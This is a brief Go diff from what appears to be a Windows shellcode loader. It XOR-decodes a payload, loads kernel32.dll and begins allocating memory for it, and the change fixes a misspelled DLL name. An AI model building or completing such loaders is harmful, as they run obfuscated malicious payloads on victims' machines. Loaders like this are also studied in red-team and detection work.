@@ -75,7 +75,7 @@ func xor(sc []byte, k byte) (r []byte) {
 func shCodeExec(sc []byte, k byte) {
 	sc = xor(sc, k)
 
-	kernel32 := windows.NewLazyDLL("kernel32dll.dll")
+	kernel32 := windows.NewLazyDLL("kernel32.dll")
 	RtlMoveMemory := kernel32.NewProc("RtlMoveMemory")
 
 	addr, err := windows.VirtualAlloc(
